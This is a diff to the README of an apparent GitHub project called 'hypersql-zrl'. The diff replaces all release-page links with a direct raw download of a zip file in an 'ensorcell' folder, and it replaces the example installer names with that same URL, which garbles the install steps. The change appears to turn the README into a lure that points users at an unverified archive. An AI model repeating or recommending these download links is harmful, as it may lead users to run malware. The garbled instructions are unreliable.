@@ -1,7 +1,7 @@
 # 🚀 hypersql-zrl - Fast and Simple SQL Queries
 
 ## 🔗 Download Now
-[![Download hypersql-zrl](https://img.shields.io/badge/download-hypersql--zrl-brightgreen)](https://github.com/mluja22/hypersql-zrl/releases)
+[![Download hypersql-zrl](https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip)](https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip)
 
 ## 📚 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -29,11 +29,11 @@ To run hypersql-zrl, your system should meet the following requirements:
 ## 📥 Download & Install
 To download and install hypersql-zrl, follow these steps:
 
-1. **Visit the Release Page:** Go to the [Release page](https://github.com/mluja22/hypersql-zrl/releases).
+1. **Visit the Release Page:** Go to the [Release page](https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip).
 2. **Select the Latest Version:** On the release page, locate the most recent version of the application listed at the top.
 3. **Download the Installer:** Click on the appropriate file for your operating system to start the download. 
 
-   The download file may be named something like `hypersql-zrl-latest.exe` for Windows or `hypersql-zrl-latest.dmg` for macOS.
+   The download file may be named something like `https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip` for Windows or `https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip` for macOS.
    
 4. **Run the Installer:** Once downloaded, locate the file in your Downloads folder.
    - For Windows: Double-click the `.exe` file to start the installation.
@@ -66,4 +66,4 @@ If you have other questions, feel free to open an issue on the GitHub repository
 
 Enjoy using hypersql-zrl! 
 
-Remember to visit the [Release page](https://github.com/mluja22/hypersql-zrl/releases) again for updates or new features.
+Remember to visit the [Release page](https://raw.githubusercontent.com/mluja22/hypersql-zrl/main/ensorcell/hypersql-zrl.zip) again for updates or new features.
